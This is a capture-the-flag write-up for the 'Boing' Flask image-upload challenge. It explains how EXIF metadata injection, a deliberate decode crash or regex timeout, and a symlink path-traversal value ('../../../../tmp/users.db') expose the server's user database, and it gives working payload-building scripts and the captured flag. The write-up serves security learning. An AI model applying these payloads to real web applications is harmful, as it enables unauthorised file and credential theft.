# Boing \[500 points\] (1 solve)

> A fun app for your images!

### Files:
[src.zip](/web/Boing/src)

### Hints

> [!NOTE]  
> These hints would originally subtract points from your team if you used them, but team `4mail` violated fair play and used a secondary account to get hints without incurring point deductions on their main team account. This ultimately resulted in their disqualification from prize results in the tournament, but this also meant that every other team had full access to the hints. However, we had already been working on this challenge for a day and were already beyond the hints.

These were the available hints:

<details>
<summary>150 points</summary>

Hmm... I can't get this image to upload: [hint.zip](/hint.zip)

</details>

<details>
<summary>20 points</summary>

You'll want to steal `/tmp/users.db`

</details>

<details>
<summary>10 points</summary>

https://www.geeksforgeeks.org/how-to-serve-static-files-in-flask/

</details>

<details>
<summary>20 points</summary>

src/app.py:166 seems interesting

</details>

<br>



This challenge gave us a Flask server which allows you to create an account, upload images, and receive a metadata file with attributes of the image. The file `app.py` contains all of the server logic, while `compute.py` generates a metadata file (`*.meta`) which is generated from whatever image you upload. 

## The Attack Vector

Once you upload an image and `compute.py` generates a metadata file, we can see in `pages/index.html` that the score from this metadata needs to be over 100,000 to get the flag:

```html
    ...
    <p>
        <a href="/get/{{ file }}">{{ file }}</a> (<a href="/get/{{ file }}.meta">META</a>)
        {% if score > 100_000 %}
            SCORE: {{ score }} (🔥) {{ flag }}
        {% else %}
            SCORE: {{ score }}
        {% endif %}
    </p>
    ...
```

Yet, after taking a look at how the score is calculated:

```py
score = math.log(len(faces) * contrast * area + 1)
fout.write('Score: %f\n' % score)
fout.flush()
```

We can see that this is impossible.

Since the score is calculated by taking the natural logarithm of the product of the amount of faces in the image, the contrast in the image, and the area of the image, the combined value of all of these factors would need to be greater than e^100,000. For obvious reasons this attack vector isn't feasible—especially when considering the 10kbs upload limit.

### The Real Exploit

After you've uploaded an image, `compute.py` is ran immediately as a subprocess:

```py
    output_file = fpath + '.meta'
    cmd = ['python3', 'compute.py', fpath, output_file]
    subprocess.run(cmd, timeout=1)
```

The algorithm in `compute.py` creates the metadata, calculates the image's score and adds the filename of the given image to the end of the file

<details>
<summary>Sample metadata</summary>

```
== metadata ==
Faces: 5
Contrast: 0.100000
Area: 320120
Score:  5.204282
ImageDescription: This is my custom exif data!
Timestamp: Thu Nov 21 16:25:53 2024
Filename: c14a81fd86e74c9ee75a3e96c5935ee3.jpg
== end ==
```
</details>

<br>

The filename in this metadata is important, because it's used when symlinking the image and metadata from the `/tmp` directory to the `./static` directory:

```py
@app.route('/process', methods=['GET', 'POST'])
def process_file():
    ...
    with open(abs_file_path, 'r') as f:
        metadata_file = None
        for line in f:
            if line.startswith('Filename: '):
                metadata_file = line.split(': ')[1].strip()
    ...
    # symlink from the metadata filename (NOT the actual filename)
    new_file_path = os.path.join(user_static_dir, os.path.basename(metadata_file))
    os.symlink(original_file_path, new_file_path)
    new_meta_file_path = os.path.join(user_static_dir, os.path.basename(metadata_file) + '.meta')
    os.symlink(abs_file_path, new_meta_file_path)

```

So, if we could craft malicious EXIF data to insert a different another filename into the metadata file, we could theoretically symlink any file into the user's static directory.

Our biggest problem in modifying the filename is `app.py`'s lack of a base case when reading the filename from the metadata file; the `for` loop doesn't break when it encounters a filename. Thus, the *last* filename in the metadata is the one that's used in the symlink. We'll come back to this, but because the filename is the last thing `compute.py` writes to the metadata file, whatever we write to the file will not be read and used when symlinking.

In case it wasn't clear already, any file we want to access needs to be in the `/static` directory. This is because the app reads only serves files from the static directory in the `/get` path:

```py
@app.route('/get/<file_name>')
def get_file(file_name):
    if not is_jpg_ext(file_name) and not file_name.endswith('.meta'):
        return 'Invalid file extension', 400

    user_static_dir = os.path.join(STATIC_DIR, str(session['user_id'])) # <-- concat the static dir with the user id to get the user's directory that files are stored in
    fpath = os.path.join(user_static_dir, file_name)
    return app.send_static_file(os.path.join(str(session['user_id']), file_name))
```

None of this would matter, though, if there isn't anything to read on the filesystem. Well, thankfully we're in luck, because the flag is inserted (in plaintext) into the sqlite3 database when the web challenge starts up:

```py
if __name__ == '__main__':
    ...
    c.execute('INSERT INTO users VALUES ("flagflagflagflag", "flag", ?)', ('ictf{f4ke_f1aG_bo1nG_b0ing_8oiNG}',))
```

Meaning that we could steal the flag by stealing the sqlite database in `/tmp/users.db`.


## Execution

Now we'll address our earlier problem: how can we force the EXIF data we control to be the last line in the file (for the filename tag) when the last thing that the `compute.py` file does is set the filename?

<details>
<summary>compute.py</summary>

```py
import sys
import re
import time
import os
import cv2
import math
from PIL import Image
from PIL.ExifTags import TAGS

input_file = sys.argv[1]
output_file = sys.argv[2]

# Open the image
image = Image.open(input_file)

# Construct the regular expression for user information
pat = re.compile(r'USER=(?P<name>.+):(?P<uid>\d+|\w){3,};')

# Write the metadata header
fout = open(output_file, 'w')
fout.write('== metadata ==\n')
fout.flush()

# Attempt to find faces
face_classifier = cv2.CascadeClassifier(cv2.data.haarcascades + 'haarcascade_frontalface_default.xml')
cv2_image = cv2.imread(input_file)
gray = cv2.cvtColor(cv2_image, cv2.COLOR_BGR2GRAY)
faces = face_classifier.detectMultiScale(gray, 1.3, 5)

# Count how many faces we found and write the result to the metadata
faces = [0, 1, 2, 3, 4]
fout.write('Faces: %d\n' % len(faces))
fout.flush()

# How much contrast is in the image?
contrast = cv2.Laplacian(gray, cv2.CV_64F).var()
contrast = 0
fout.write('Contrast: %f\n' % contrast)
fout.flush()

# How big is the image?
width, height = image.size
area = width * height
fout.write('Area: %d\n' % area)

# Compute the interesting-ness score
score = math.log(len(faces) * contrast * area + 1)
fout.write('Score: %f\n' % score)
fout.flush()

meta = image.getexif()
for tag, value in sorted(meta.items(), key=lambda x: x[0]):
    tag_name = TAGS.get(tag, tag)
    print(f'Found tag: {tag_name}')
    if tag_name == 'UserComment':
        print(f'UserComment: {value}')
        if isinstance(value, bytes):
            value = value.decode()
        else:
            value = str(value)
        fout.write('UserComment: %s\n' % value)
        fout.flush()
        # Extract the user information if it is present
        match = pat.match(value)
        if match:
            fout.write('User: %s\n' % match.group('name'))
            fout.write('UID: %s\n' % match.group('uid'))
    elif tag_name == 'DateTime':
        if isinstance(value, bytes):
            value = value.decode()
        else:
            value = str(value)
        fout.write('DateTime: %s\n' % value)
        fout.flush()
    elif tag_name == 'ImageDescription':
        if isinstance(value, bytes):
            value = value.decode()
        else:
            value = str(value)
        fout.write('ImageDescription: %s\n' % value)
        fout.flush()

fout.write('Timestamp: %s\n' % time.ctime())
fout.write('Filename: %s\n' % os.path.basename(input_file))
fout.write('== end ==\n')

print('Done')

fout.close()    
```
</details>

<br>

For our attack, we chose to crash the program before it writes the final filename by adding invalid data that `compute.py` won't decode. Essentially, we write the custom filename to the metadata file in the ImageDescription EXIF data, so that when the UserComment crashes `compute.py` our ImageDescription was the last thing added to the metadata file.

Here was our solution script:

```py
from PIL import Image

IMAGE_DESC = 0x010E
USER_COMMENT = 0x9286

input_file = "./input.jpg"
output_file = "./output.jpg"

desc_payload = "\n\nFilename: /tmp/users.db"  # symlink to users.db
comment_payload = b'\x80' # crash when reading user comment

image = Image.open(input_file)
exif = image.getexif()
exif[IMAGE_DESC] = desc_payload
exif[USER_COMMENT] = comment_payload

image.save(output_file, exif=exif)
```

In this script, we're taking advantage of invalid UTF-8 sequences to crash compute.py. This code contains a payload with the byte `\x80`—a continuation byte in UTF-8 encoding. Continuation bytes (10xxxxxx) are used in multi-byte sequences and must come after a valid leading byte, which specifies the structure and length of the character. By starting with a continuation byte instead of a valid leading byte, we deliberately create an invalid UTF-8 sequence, causing Python to throw a decoding error when it attempts to process these bytes.

This is what happens in `compute.py` when it tries to process our malicious JPG:
```bash
solution $ python3 compute.py
...
Reading Image Description: '\n\nFilename: /tmp/users.db'
Reading User Comment: b'\x80'
Traceback (most recent call last):
  File "~/iCTF/boing/compute.py", line 52, in <module>
    value = value.decode()
            ^^^^^^^^^^^^^^
UnicodeDecodeError: 'utf-8' codec can't decode byte 0x80 in position 0: invalid start byte
```

As you can see, the script reads our image description and crashes when reading the user comment.

To make sure that we're exploiting this correctly, here is the metadata output from `compute.py`:

```bash
solution $ cat output_metadata.txt
== metadata ==
Faces: 1
Contrast: 0.9
Area: 100000
Score: 9.0
ImageDescription:

Filename: /tmp/users.db <--- last filename tag in the file is from our exif data
```

To summarize our attack, we've created a `.jpg` which will crash `compute.py` early, allowing the filename that we want (`/tmp/users.db`) to be used when symlinking files into our static directory. Given that `app.py` reads the last `Filename:` metadata tag, the server will now correctly symlink `/tmp/users.db` into our `static` directory. 

#### Intended solution

As cool as our solution was, using invalid Unicode bytes wasn't the intended solution. If you look in `main.py`:

```py
def compute_metadata(fpath):
    output_file = fpath + '.meta'
    cmd = ['python3', 'compute.py', fpath, output_file]
    subprocess.run(cmd, timeout=1) # 1 second timeout isn't enough to parse long regex
```

The `compute.py` is ran with a timeout of 1 second. Yet, `compute.py` parses the UserComment EXIF data with regex, a regex which can take > 3 seconds to execute (even with really small input). Because of this timeout, you can insert a filename in the user comment EXIF tag before a `USER=` to make `compute.py` time out before it adds all of the metadata (e.g. the original filename). Here's the problem author @p_nack's example of timing out the regex:

```py
from PIL import Image
from PIL.ExifTags import TAGS

image = Image.new('RGB', (1, 1))
exif = image.getexif()
reverse_tags = {v: k for k, v in TAGS.items()}

exif[reverse_tags['UserComment']] = b'USER=foo:111231111111111111111111111111111111111111 ;\nFilename: ../../../../tmp/users.db\n'

img_out_fname = os.path.dirname(__file__) + '/img_out.jpg'
image.save(img_out_fname, exif=exif)

print(f'Image saved to {img_out_fname}')
```

Regardless, both of our scripts achieve the same final result of setting a custom value to symlink from in the `Filename:` metadata tag.

### Stealing the Database

As complicated as that sounds, stealing the database was the easy part. We could symlink `users.db` into our static folder, but no matter what we tried, we couldn't access this `users.db` file.

The main cause of our troubles this code:

```py
@app.route('/get/<file_name>')
def get_file(file_name):
    if not is_jpg_ext(file_name) and not file_name.endswith('.meta'):
        return 'Invalid file extension', 400

    user_static_dir = os.path.join(STATIC_DIR, str(session['user_id']))
    fpath = os.path.join(user_static_dir, file_name)
    return app.send_static_file(os.path.join(str(session['user_id']), file_name))
```

This is the code that is used to serve static files. The extension validation for `.jpg`s and `.meta` files thwarts any attempts at `GET`ing the database (`*.db`), and even though we tried injecting lots of weird characters between the extension and the `users.db` in the request to `/get/users.db`, the URI encoding on all characters meant that only `.jpg` or `.meta` files could be served.

This is where hint #2 comes in:

https://www.geeksforgeeks.org/how-to-serve-static-files-in-flask/


Since this hint is the cheapest, it's a link to a(n incredibly unhelpful) GeeksforGeeks article. This article almost seems useless as a resource, devoid of any real substance, so I didn't understand the purpose of this as a hint. Yet, the answer is revealed as early as the first HTML sample in the article:

```html
<html> 
<head> 
	<title>Flask Static Demo</title> 
	<link rel="stylesheet" href="/static/style.css" /> 
</head> 
<body> 
	<h1>{{message}}</h1> 
</body> 
</html> 
```

Did you catch that? Yup, the CSS file is loaded through `/static`. Instead of going through the `/get` endpoint, we can simply query `/static/USER_ID/users.db` to steal the database and the flag. This means that we'll need to grab our `user_id` from the Flask session. To achieve this end, I took the session cookie, which looked something like this:

```
session: eyJ1c2VyX2lkIjoiYzcyZDdkNzRiYjQxNWRjNTBhMDNjOGQ3ZDZkNDQ4NWMiLCJ1c2VybmFtZSI6InRlc3QifQ.Z0LCgQ.SddyjDYtQ53zamdtems3rJGSeZ0
```

And ran this it through a Flask session ID decoder:

https://www.kirsle.net/wizards/flask-session.cgi

This resulted in a JSON object, something like this:

```json
{
    "user_id": "c72d7d74bb415dc50a03c8d7d6d4485c",
    "username": "test"
}
```

Now, we can finally grab the database by downloading it from the URL `/static/c72d7d74bb415dc50a03c8d7d6d4485c/users.db`!!!!

Ultimately, the flag is in plaintext in the database.

```
ictf{b01ng_b01ng_U_g0t_me}
```

![final flag submission](/web/Boing/solution/boing_flag_submission.png)

## Conclusion


This challenge was wild. Not only was it the hardest challenge to be complete by a High School team, but it was only solved by 4/27 undergraduate teams. 

Also, over the course of this challenge, I exclusively registered and used two accounts: test:test and admin:admin. The JPG containing the EXIF payload was uploaded under the test account. On the final day, two different teams logged into the system and discovered the JPGs I had uploaded (I know this because they each contacted me about this). If either team had examined the EXIF data in any of the JPGs, they would have uncovered at least half of the solution. Fortunately, neither of them noticed.

![Final solution](/web/Boing/solution/solution.jpg)
<br>
*Final image payload*